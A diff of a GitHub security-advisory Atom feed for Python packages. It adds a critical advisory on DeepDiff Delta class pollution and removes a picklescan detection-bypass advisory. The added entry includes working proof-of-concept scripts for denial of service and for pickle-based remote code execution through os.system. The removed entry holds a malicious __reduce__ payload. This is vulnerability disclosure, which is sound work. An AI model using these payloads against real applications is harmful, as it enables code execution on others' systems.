@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-09-03T22:01:35.746Z</updated>
+    <updated>2025-09-03T23:01:34.668Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,191 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[deepdiff] DeepDiff Class Pollution in Delta class leading to DoS, Remote Code Execution, and more]]></title>
+        <id>https://github.com/advisories/GHSA-mw26-5g2v-hqw3</id>
+        <link href="https://github.com/advisories/GHSA-mw26-5g2v-hqw3"/>
+        <updated>2025-09-03T22:25:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><a href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Python class pollution</a> is a novel vulnerability categorized under <a href="https://cwe.mitre.org/data/definitions/915.html">CWE-915</a>. The <code>Delta</code> class is vulnerable to class pollution via its constructor, and when combined with a gadget available in DeltaDiff itself, it can lead to Denial of Service and Remote Code Execution (via insecure <a href="https://docs.python.org/3/library/pickle.html">Pickle</a> deserialization).</p>
+<p>The gadget available in DeepDiff allows <code>deepdiff.serialization.SAFE_TO_IMPORT</code> to be modified to allow dangerous classes such as <code>posix.system</code>, and then perform insecure Pickle deserialization via the Delta class. This potentially allows any Python code to be executed, given that the input to <code>Delta</code> is user-controlled.</p>
+<p>Depending on the application where DeepDiff is used, this can also lead to other vulnerabilities. For example, in a web application, it might be possible to bypass authentication via class pollution.</p>
+<h3 id="details">Details</h3>
+<p>The <code>Delta</code> class can take different object types as a parameter in its constructor, such as a <code>DeltaDiff</code> object, a dictionary, or even just bytes (that are deserialized via Pickle).</p>
+<p>When it takes a dictionary, it is usually in the following format:</p>
+<pre><code class="language-py">Delta({"dictionary_item_added": {"root.myattr['foo']": "bar"}})
+</code></pre>
+<p>Trying to apply class pollution here does not work, because there is already a filter in place: <a href="https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L23">https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L23</a></p>
+<p>However, this code only runs when parsing the path from a string.
+The <code>_path_to_elements</code> function helpfully returns the given input if it is already a list/tuple:
+<a href="https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L52-L53">https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L52-L53</a></p>
+<p>This means that it is possible to pass the path as the internal representation used by Delta, bypassing the filter:</p>
+<pre><code class="language-py">Delta(
+    {
+        "dictionary_item_added": {
+            (
+                ("root", "GETATTR"),
+                ("__init__", "GETATTR"),
+                ("__globals__", "GETATTR"),
+                ("PWNED", "GET"),
+            ): 1337
+        }
+    },
+)
+</code></pre>
+<p>Going back to the possible inputs of <code>Delta</code>, when it takes a <code>bytes</code> as input, it uses pickle to deserialize them.
+Care was taken by DeepDiff to prevent arbitrary code execution via the <code>SAFE_TO_IMPORT</code> allow list.
+<a href="https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/serialization.py#L62-L98">https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/serialization.py#L62-L98</a>
+However, using the class pollution in the <code>Delta</code>, an attacker can add new entries to this <code>set</code>.</p>
+<p>This then allows a second call to <code>Delta</code> to <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">unpickle an insecure class</a> that runs <code>os.system</code>, for example.</p>
+<h4 id="using-dict">Using dict</h4>
+<p>Usually, class pollution <a href="https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca#technical-details">does not work</a> when traversal starts at a <code>dict</code>/<code>list</code>/<code>tuple</code>, because it is not possible to reach <code>__globals__</code> from there.
+However, using two calls to <code>Delta</code> (or just one call if the target dictionary that already contains at least one entry) it is possible to first change one entry of the dictionary to be of type <code>deepdiff.helper.Opcode</code>, which then allows traversal to <code>__globals__</code>, and notably <code>sys.modules</code>, which in turn allows traversal to any module already loaded by Python.
+Passing <code>Opcode</code> around can be done via pickle, which <code>Delta</code> will happily accept given it is in the default allow list.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p>With deepdiff 8.6.0 installed, run the following scripts for each proof of concept.
+All input to <code>Delta</code> is assumed to be user-controlled.</p>
+<h4 id="denial-of-service">Denial of Service</h4>
+<p>This script will pollute the value of <code>builtins.int</code>, preventing the class from being used and making code crash whenever invoked.</p>
+<pre><code class="language-py"># ------------[ Setup ]------------
+import pickle
+
+from deepdiff.helper import Opcode
+
+pollute_int = pickle.dumps(
+    {
+        "values_changed": {"root['tmp']": {"new_value": Opcode("", 0, 0, 0, 0)}},
+        "dictionary_item_added": {
+            (
+                ("root", "GETATTR"),
+                ("tmp", "GET"),
+                ("__repr__", "GETATTR"),
+                ("__globals__", "GETATTR"),
+                ("__builtins__", "GET"),
+                ("int", "GET"),
+            ): "no longer a class"
+        },
+    }
+)
+
+
+assert isinstance(pollute_int, bytes)
+
+# ------------[ Exploit ]------------
+# This could be some example, vulnerable, application.
+# The inputs above could be sent via HTTP, for example.
+
+from deepdiff import Delta
+
+# Existing dictionary; it is assumed that it contains
+# at least one entry, otherwise a different Delta needs to be
+# applied first, adding an entry to the dictionary.
+mydict = {"tmp": "foobar"}
+
+# Before pollution
+print(int("41") + 1)
+
+# Apply Delta to mydict
+result = mydict + Delta(pollute_int)
+
+print(int("1337"))
+</code></pre>
+<pre><code class="language-shell">$ python poc_dos.py
+42
+Traceback (most recent call last):
+  File "/tmp/poc_dos.py", line 43, in &lt;module&gt;
+    print(int("1337"))
+TypeError: 'str' object is not callable
+</code></pre>
+<h4 id="remote-code-execution">Remote Code Execution</h4>
+<p>This script will create a file at <code>/tmp/pwned</code> with the output of <code>id</code>.</p>
+<pre><code class="language-py"># ------------[ Setup ]------------
+import os
+import pickle
+
+from deepdiff.helper import Opcode
+
+pollute_safe_to_import = pickle.dumps(
+    {
+        "values_changed": {"root['tmp']": {"new_value": Opcode("", 0, 0, 0, 0)}},
+        "set_item_added": {
+            (
+                ("root", "GETATTR"),
+                ("tmp", "GET"),
+                ("__repr__", "GETATTR"),
+                ("__globals__", "GETATTR"),
+                ("sys", "GET"),
+                ("modules", "GETATTR"),
+                ("deepdiff.serialization", "GET"),
+                ("SAFE_TO_IMPORT", "GETATTR"),
+            ): set(["posix.system"])
+        },
+    }
+)
+
+
+# From https://davidhamann.de/2020/04/05/exploiting-python-pickle/
+class RCE:
+    def __reduce__(self):
+        cmd = "id &gt; /tmp/pwned"
+        return os.system, (cmd,)
+
+
+# Wrap object with dictionary so that Delta does not crash
+rce_pickle = pickle.dumps({"_": RCE()})
+
+assert isinstance(pollute_safe_to_import, bytes)
+assert isinstance(rce_pickle, bytes)
+
+# ------------[ Exploit ]------------
+# This could be some example, vulnerable, application.
+# The inputs above could be sent via HTTP, for example.
+
+from deepdiff import Delta
+
+# Existing dictionary; it is assumed that it contains
+# at least one entry, otherwise a different Delta needs to be
+# applied first, adding an entry to the dictionary.
+mydict = {"tmp": "foobar"}
+
+# Apply Delta to mydict
+result = mydict + Delta(pollute_safe_to_import)
+
+Delta(rce_pickle)  # no need to apply this Delta
+</code></pre>
+<pre><code class="language-shell">$ python poc_rce.py
+$ cat /tmp/pwned
+uid=1000(dtc) gid=100(users) groups=100(users),1(wheel)
+</code></pre>
+<h3 id="who-is-affected">Who is affected?</h3>
+<p>Only applications that pass (untrusted) user input directly into <code>Delta</code> are affected.</p>
+<p>While input in the form of <code>bytes</code> is the most flexible, there are certainly other gadgets, depending on the application, that can be used via just a dictionary. This dictionary could easily be parsed, for example, from JSON. One simple example would be overriding <code>app.secret_key</code> of a Flask application, which would allow an attacker to sign arbitrary cookies, leading to an authentication bypass.</p>
+<h3 id="mitigations">Mitigations</h3>
+<p>A straightforward mitigation is preventing traversal through private keys, like it is already done in the path parser.
+This would have to be implemented in both <code>deepdiff.path._get_nested_obj</code> and <code>deepdiff.path._get_nested_obj_and_force</code>,
+and possibly in <code>deepdiff.delta.Delta._get_elements_and_details</code>.
+Example code that raises an error when traversing these properties:</p>
+<pre><code class="language-py">if elem.startswith("__") and elem.endswith("__"):
+  raise ValueError("traversing dunder attributes is not allowed")
+</code></pre>
+<p>However, if it is desirable to still support attributes starting and ending with <code>__</code>, but still protect against this vulnerability, it is possible to only forbid <code>__globals__</code> and <code>__builtins__</code>, which stops the most serious cases of class pollution (but not all).
+This was the solution adopted by pydash: <a href="https://github.com/dgilland/pydash/issues/180">https://github.com/dgilland/pydash/issues/180</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/seperman/deepdiff/security/advisories/GHSA-mw26-5g2v-hqw3">https://github.com/seperman/deepdiff/security/advisories/GHSA-mw26-5g2v-hqw3</a></li>
+<li><a href="https://github.com/dgilland/pydash/issues/180">https://github.com/dgilland/pydash/issues/180</a></li>
+<li><a href="https://github.com/dgilland/pydash/commit/2015f0a4bcdbc3a5b27652e38fe97b3ee13ac15f">https://github.com/dgilland/pydash/commit/2015f0a4bcdbc3a5b27652e38fe97b3ee13ac15f</a></li>
+<li><a href="https://github.com/advisories/GHSA-mw26-5g2v-hqw3">https://github.com/advisories/GHSA-mw26-5g2v-hqw3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mw26-5g2v-hqw3</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-09-03T22:25:09.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[mobsf] MobSF Path Traversal in GET /download/<filename> using absolute filenames]]></title>
         <id>https://github.com/advisories/GHSA-ccc3-fvfx-mw3v</id>
@@ -895,47 +1080,5 @@ Supply Chain Attack: Attackers can distribute infected pickle files across ML mo
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-08-26T21:34:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[picklescan] Picklescan is missing detection when calling pytorch function torch.utils.bottleneck.__main__.run_autograd_prof]]></title>
-        <id>https://github.com/advisories/GHSA-4whj-rm5r-c2v8</id>
-        <link href="https://github.com/advisories/GHSA-4whj-rm5r-c2v8"/>
-        <updated>2025-08-26T21:25:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Using torch.utils.bottleneck.__main__.run_autograd_prof function, which is a pytorch library function to execute remote pickle file.</p>
-<h3 id="details">Details</h3>
-<p>The attack payload executes in the following steps:</p>
-<p>First, the attacker craft the payload by calling to torch.utils.bottleneck.<strong>main</strong>.run_autograd_prof function in reduce method
-Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>import torch.utils.bottleneck.__main__ as bottleneck_main
-
-class EvilTorchUtilsBottleneckRunAutogradProf:
-    def __reduce__(self):
-        code = '__import__("os").system("whoami")'
-        globs = {}
-        return bottleneck_main.run_autograd_prof, (code, globs)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
-What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
-Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.</p>
-<h3 id="corresponding">Corresponding</h3>
-<p><a href="https://github.com/FredericDT">https://github.com/FredericDT</a>
-<a href="https://github.com/Qhaoduoyu">https://github.com/Qhaoduoyu</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4whj-rm5r-c2v8">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-4whj-rm5r-c2v8</a></li>
-<li><a href="https://github.com/mmaitre314/picklescan/commit/1931c2d04eaca8d20597705ff39cab78ba364e4b">https://github.com/mmaitre314/picklescan/commit/1931c2d04eaca8d20597705ff39cab78ba364e4b</a></li>
-<li><a href="https://github.com/advisories/GHSA-4whj-rm5r-c2v8">https://github.com/advisories/GHSA-4whj-rm5r-c2v8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4whj-rm5r-c2v8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-08-26T21:25:34.000Z</published>
     </entry>
 </feed>
